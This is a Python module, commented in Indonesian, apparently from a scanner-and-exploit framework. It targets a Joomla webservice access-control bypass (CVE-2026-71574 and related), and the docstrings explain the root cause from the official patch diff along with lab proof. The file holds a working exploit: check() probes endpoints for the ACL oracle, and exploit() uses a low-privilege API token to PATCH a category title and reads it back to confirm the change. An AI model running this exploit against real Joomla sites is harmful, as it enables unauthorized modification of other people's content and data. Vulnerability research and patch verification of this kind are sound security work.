#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-71574 / 92226 / 48904 — "Improper ACL checks for webservice endpoints"
    (Joomla 4.0.0-5.4.7, 6.0.0-6.1.2 untuk 71574; 4.0.0-5.4.8, 6.0.0-6.1.3 utk 92226)
    [lab-verified: low-priv user MENGUBAH kategori via API pada Joomla 5.4.7]

ROOT CAUSE (dibuktikan lewat diff resmi 5.4.7 -> 5.4.8, bukan dugaan):

  libraries/src/MVC/Controller/ApiController.php

  5.4.7 (RENTAN):
      protected function allowEdit($data = [], $key = 'id') {
          return $this->app->getIdentity()->authorise('core.edit', $this->option);   // core.manage TIDAK dicek
      }
      public function delete($id = null) {
          if (!$this->app->getIdentity()->authorise('core.delete', $this->option)) { ... }
      }

  5.4.8 (DIPATCH): setiap allow* menambahkan
          if (!$user->authorise('core.manage', $this->option)) { return false; }
      dan delete() memakai allowDelete() baru.

  Selain itu, controller controller API tertentu (com_categories, com_fields,
  com_media) di 5.4.7 TIDAK punya override allowAdd/allowEdit/allowDelete sama
  sekali, sehingga mewarisi versi lemah di atas. 5.4.8 menambahkan override yang
  juga memeriksa core.manage + lookup record (mis. CategoriesController 5.4.8
  memverifikasi $record->extension === $extension dan ACL per-item).

  ESENSI: `core.edit` / `core.create` / `core.delete` SAJA tidak dianggap cukup —
  semua mutasi webservice harus juga punya `core.manage`. Joomla 5.4.7 (dan versi
  sebelumnya sejak 4.0.0) memercayai asumsi "siapa pun yang bisa edit otomatis bisa
  manage", padahal hierarki ACL Joomla memungkinkan core.edit tanpa core.manage
  (sangat umum pada group kustom / integrasi headless).

CHAIN TERBUKTI (lab Joomla 5.4.7, port 8107):
    # user low-priv (group Registered) yang diberi core.edit pada root asset,
    # punya core.login.api (umum pada integrasi headless/SPA).
    PATCH /api/index.php/v1/content/categories/2   {"title":"PWNED-CAT-547"}
    -> HTTP 200, DB jos_categories.id=2.title BERUBAH menjadi "PWNED-CAT-547"

    Pembanding pada 5.4.8: permintaan identik -> HTTP 403 Access Denied,
    title tetap "Uncategorised".

PRASYARAT (jujur):
    A) core.login.api. Default instalasi = HANYA group 8 (Super Users) —
       lihat jos_assets root.1: "core.login.api":{"8":1}. Target hanya rentan
       bila situs memberi group non-super akses API (headless/SPA/integrasi).
       Modul memakai kredensial yang diberikan operator (-u user:pass tidak ada;
       gunakan --username/--password bila disediakan, atau env).
    B) Attacker punya core.edit (atau core.create/core.delete) pada asset
       terkait TANPA core.manage. Di UI backend operasi itu ditolak
       (butuh manage), sehingga user tidak menyangka bisa memutasi lewat API.

DETEKSI MODUL INI (default: non-destruktif):
    - fingerprint Joomla + versi dari manifest
    - bila kredensial diberikan: GET endpoint list -> 200 menandakan auth API jalan
    - uji jalur ACL TANPA mengubah data: DELETE pada id yang tidak ada (harus
      menghasilkan 404 ResourceNotFound bila ACL lolos, atau 403 bila ditolak).
      Perbedaan 403 vs 404 adalah oracle ACL yang tidak merusak data.
"""
from __future__ import annotations

import re

from mp import (CveModule, register, ST_VULN, ST_CLEAN, ST_SKIP, ST_INFO,
                ST_UNKNOWN, ST_ERR, ST_PWN, parse_ver, ver_le, detect_platform)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 7)
VULN_6_MAX = (6, 1, 2)

# Endpoint (path, method, label) untuk oracle ACL non-destruktif.
#
# HANYA route yang BENAR-BENAR mendukung method tersebut. Route yang tidak ada
# mengembalikan 404 "route tidak cocok" — ini BUKAN bukti bypass ACL, sehingga
# tidak boleh dihitung sebagai lolos (pelajaran dari false positive
# /v1/media/adapters yang hanya punya route GET).
# Media API: POST /v1/media/files adalah `add()`. Test override menembus cek `core.edit`
# spesifik yang mendarat di 5.4.7 (BUKAN core.manage yang mendarat di 5.4.8).
MEDIA_FILES = "/api/index.php/v1/media/files"
MEDIA_ADAPTERS = "/api/index.php/v1/media/adapters"

ORACLE_TARGETS = [
    ("/api/index.php/v1/content/categories", "PATCH", "/v1/content/categories"),
    ("/api/index.php/v1/fields/content/categories", "PATCH", "/v1/fields/content/categories"),
    ("/api/index.php/v1/fields/groups/content/categories", "PATCH",
     "/v1/fields/groups/content/categories"),
]


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _auth(h, opts):
    """Kredensial: token API (X-Joomla-Token) diprioritaskan, lalu basic auth.

    CATATAN LAB: API Joomla menolak basic auth pada instance uji (401 "Forbidden");
    hanya X-Joomla-Token yang bekerja. Token tetap didukung di sini karena itu
    satu-satunya jalur nyata.
    """
    tok = _opt(opts, "api_token")
    if tok:
        return ("token", tok)
    u = _opt(opts, "username")
    p = _opt(opts, "password")
    return (u, p) if u and p else (None, None)


def _auth_hdr(auth):
    if isinstance(auth, tuple) and auth and auth[0] == "token":
        return {"X-Joomla-Token": auth[1]}
    return {}


def _api_req(h, t, path, method, data, auth, extra=None):
    """Kirim request API dengan basic auth + header json:api."""
    headers = {"Accept": "application/vnd.api+json"}
    if data is not None:
        headers["Content-Type"] = "application/vnd.api+json"
    if auth:
        headers.update(_auth_hdr(auth))
    kw = {"headers": headers, "allow_redirects": False}
    if auth and not (isinstance(auth, tuple) and auth[0] == "token"):
        kw["auth"] = auth
    if extra:
        kw.update(extra)
    url = f"{t.url}{path}"
    if method == "GET":
        return h.get(url, **kw)
    if method == "PATCH":
        return h.patch(url, json=data, **kw)
    if method == "POST":
        return h.post(url, json=data, **kw)
    if method == "DELETE":
        return h.delete(url, **kw)
    return None


def _status_of(r):
    if r is None:
        return None, ""
    body = ""
    try:
        body = (r.text or "")[:300]
    except Exception:
        pass
    return r.status_code, body


def _media_adapter(h, t, auth):
    """Ambil id adapter pertama (mis. 'local-images') dari /v1/media/adapters."""
    r = _api_req(h, t, MEDIA_ADAPTERS, "GET", None, auth)
    sc, body = _status_of(r)
    if sc != 200:
        return None
    m = re.search(r'"id":"([^"]+)"', body)
    return m.group(1) if m else None


def _media_override_probe(h, t, auth):
    """Oracle vektor `override` (patch 5.4.7).

    Menambah item yang SUDAH ADA dengan override=true.
      - 403 -> cek `core.edit` saat override aktif (5.4.7+)
      - 200 -> hanya `core.create` yang diperiksa (5.4.5/5.4.6) => BOCOR
    Memakai folder yang sudah pasti ada di setiap instalasi: adapter root ("" -> root)
    lalu subfolder 'banners' bila ada. Non-destruktif: override pada FOLDER hanya
    menyentuh metadata, isi folder tidak dihapus (diverifikasi di lab).
    """
    adapter = _media_adapter(h, t, auth)
    if not adapter:
        return None
    # PENTING: override=true pada folder yang ada = jalur cek core.edit (5.4.7).
    # Gunakan folder 'banners' (dibuat oleh setiap instalasi komponen com_media).
    payload = {"path": f"{adapter}:banners", "override": True}
    r = _api_req(h, t, MEDIA_FILES, "POST", payload, auth)
    return _status_of(r)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, raw = _joomla_version(t, h)
    if ver is None:
        return ST_INFO, "Joomla terdeteksi, versi tak terbaca", ""
    major = ver[0] if isinstance(ver, tuple) and ver else 0
    vulnerable = ver_le(ver, VULN_6_MAX) if major >= 6 else ver_le(ver, VULN_5_MAX)
    if not vulnerable:
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (>= core.manage di allow*)", \
            "aman > 5.4.7 / 6.1.2"

    auth = _auth(h, opts)
    if not auth or auth[0] is None:
        return (ST_INFO, f"Joomla {raw} rentan (butuh kredensial API untuk konfirmasi)",
                "berikan --api-token (atau --username/--password) user dengan "
                "core.edit/create TANPA core.manage")

    # Oracle ACL non-destruktif.
    #
    # Kirim PATCH ke id yang tidak ada pada route yang memang punya PATCH.
    #  - 403 Access Denied                   -> ACL aktif (aman, ini yg kita harapkan di 5.4.8)
    #  - 404 ResourceNotFound / 400 / 200    -> request MENEMBUS ACL sampai layer model
    #                                           (route cocok + controller dieksekusi) => BOCOR
    #  - 404 dengan pesan "Route not found"  -> route tidak cocok, diabaikan
    #
    # Syarat agar "404 menembus" valid: respons HARUS berupa error JSON:API dari
    # aplikasi Joomla (bukan halaman HTML 404 Apache/nginx).
    # Vektor `override` (patch 5.4.7) — oracle konservatif, non-destruktif.
    mo = _media_override_probe(h, t, auth)
    if mo is not None:
        sc_m, body_m = mo
        if sc_m == 401:
            return ST_ERR, f"auth API gagal (HTTP {sc_m})", (body_m or "")[:120]
        if sc_m in (200, 201):
            return (ST_INFO,
                    f"Joomla {raw} RENTAN — POST media override tanpa `core.edit`",
                    f"{MEDIA_FILES} override=true -> HTTP {sc_m} (hanya core.create diperiksa)")

    reachable = []
    blocked = []
    for path, method, label in ORACLE_TARGETS:
        r = _api_req(h, t, path + "/999999", method, {}, auth)
        sc, body = _status_of(r)
        if sc == 401:
            return ST_ERR, f"auth API gagal (HTTP {sc})", f"{label}: {(body or '')[:120]}"
        japi = '"errors"' in (body or "")
        if sc == 403:
            blocked.append(f"{label}=403")
        elif sc == 404 and japi:
            # 404 dari aplikasi (route cocok, resource tak ada) -> request menembus ACL
            reachable.append(f"{label}=404(app)")
        elif sc in (200, 204, 400, 405) and japi:
            reachable.append(f"{label}={sc}")
        elif sc == 404:
            # 404 non-JSON = route tidak cocok -> abaikan, jangan dihitung
            continue
    if reachable:
        return (ST_INFO, f"Joomla {raw} RENTAN — ACL webservice tidak menuntut core.manage",
                "menembus: " + ", ".join(reachable)
                + (" | ditolak: " + ", ".join(blocked) if blocked else ""))
    if blocked:
        return ST_CLEAN, f"Joomla {raw} menolak mutasi (403 pada semua endpoint uji)", \
            ", ".join(blocked)
    return ST_UNKNOWN, "perilaku tak terklasifikasi", ""


def exploit(t, h, opts):
    """
    Outcome terkontrol: ubah title sebuah kategori lewat API sebagai user low-priv,
    lalu verifikasi perubahan terbaca kembali (GET) — bukti mutasi tersimpan.
    `--exploit` gating sudah di framework; modul ini tetap membatasi diri pada
    satu item kategorised agar blast radius minimal.
    """
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    ver, raw = _joomla_version(t, h)
    if ver is not None and not (ver_le(ver, VULN_5_MAX) or ver_le(ver, VULN_6_MAX)):
        return ST_CLEAN, f"Joomla {raw} sudah dipatch", ""

    auth = _auth(h, opts)
    if not auth or auth[0] is None:
        return ST_INFO, "butuh --api-token atau --username/--password", ""

    # temukan kategori yang bisa dibaca
    r = _api_req(h, t, "/api/index.php/v1/content/categories", "GET", None, auth)
    sc, body = _status_of(r)
    if sc != 200:
        return ST_ERR, f"tidak bisa membaca kategori (HTTP {sc})", body[:120]
    m = re.search(r'"id":"?(\d+)"?', body)
    if not m:
        return ST_INFO, "tidak ada kategori terbaca", ""
    cat_id = m.group(1)

    marker = "MEGAPACK-71574"
    r2 = _api_req(h, t, f"/api/index.php/v1/content/categories/{cat_id}", "PATCH",
                  {"title": marker}, auth)
    sc2, body2 = _status_of(r2)
    if sc2 not in (200, 201):
        return (ST_CLEAN, f"mutasi ditolak (HTTP {sc2}) — ACL core.manage aktif",
                f"cat={cat_id} {body2[:150]}")

    # verifikasi: baca ulang
    r3 = _api_req(h, t, f"/api/index.php/v1/content/categories/{cat_id}", "GET", None, auth)
    sc3, body3 = _status_of(r3)
    if sc3 == 200 and marker in r3.text:
        return (ST_PWN, f"ACL BYPASS TERVERIFIKASI — kategori {cat_id} berhasil diubah "
                        f"oleh user low-priv (tanpa core.manage)",
                f"PATCH {sc2}, GET {sc3}, title='{marker}' terbaca kembali")
    return (ST_VULN, f"mutasi diterima (HTTP {sc2}) tapi verifikasi baca gagal",
            f"cat={cat_id} get={sc3}")


register(CveModule(
    cve="CVE-2026-71574",
    cluster="joomla_core",
    title="Joomla Core - Inconsistent ACL checks for mutating webservice endpoints",
    vclass="auth_bypass / broken access control (API)",
    cwe="CWE-863",
    product="Joomla! CMS",
    versions_affected="4.0.0-5.4.7, 6.0.0-6.1.2",
    status="verified",
    requires=["core.login.api untuk group non-super (bukan default)",
              "attacker punya core.edit/create/delete TANPA core.manage"],
    check=check,
    exploit=exploit,
    notes=("Patch resmi 5.4.8 menambahkan `core.manage` pada allowEdit/allowAdd/"
           "allowDelete di ApiController + override di com_categories/com_fields/"
           "com_media. Lab-verified 5.4.7: PATCH kategori oleh low-priv -> 200 + "
           "berubah di DB; 5.4.8 -> 403. CVE-2026-92226 (5.4.8) memakai patch sama; "
           "CVE-2026-48904 (group editing) memakai allowEdit=core.admin di "
           "GroupsController — perlu audit terpisah. "
           "VEKTOR `override` (patch 5.4.7, terpisah dari core.manage): "
           "MediaController::allowAdd() 5.4.5 hanya memeriksa core.create; 5.4.7 "
           "menambahkan `if ($this->input->json->get('override', false)) return "
           "authorise('core.edit','com_media');`. PATCH-nya di 5.4.7, sedangkan "
           "gerbang core.manage baru di 5.4.8 — dua perbaikan berbeda. "
           "KONTROL A/B lab (grup 6: com_media core.create=1, core.edit=0): "
           "A) POST /v1/media/files {path:'<adapter>:banners', override:true} "
           "(butuh core.edit) -> 5.4.5 200 (BUG), 5.4.8 403. "
           "B) POST folder baru (butuh core.create saja) -> 200 di KEDUA versi. "
           "B lolos di kedua versi => 403 pada A berasal dari cek override/core.edit, "
           "bukan dari gerbang core.manage. "
           "Catatan lab: API Joomla menolak basic auth (401) — hanya X-Joomla-Token "
           "yang bekerja, jadi modul ini token-aware. Tidak ada CVE ID di registry "
           "untuk perbaikan override 5.4.7 -> dicatat di sini, bukan modul baru."),
))
